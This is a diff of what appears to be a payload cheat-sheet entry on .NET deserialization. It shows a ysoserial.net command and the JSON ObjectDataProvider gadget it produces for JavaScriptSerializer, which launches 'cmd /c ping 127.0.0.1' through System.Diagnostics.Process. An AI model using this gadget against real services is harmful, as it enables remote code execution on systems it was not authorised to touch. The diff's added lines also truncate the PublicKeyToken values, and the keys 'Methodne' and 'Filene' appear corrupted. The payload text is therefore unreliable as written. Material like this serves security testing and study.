@@ -26,12 +26,12 @@ Payload generated with ysoserial.net
 ```
 .\ysoserial.exe -o raw -g ObjectDataProvider -f JavaScriptSerializer -c "ping 127.0.0.1"
 	{
-	    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+	    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf35',
 	    'Methodne':'Start',
 	    'ObjectInstance':{
 	        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
 	        'StartInfo': {
-	            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+	            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77089',
 	            'Filene':'cmd',
 	            'Arguments':'/c ping 127.0.0.1'
 	        }
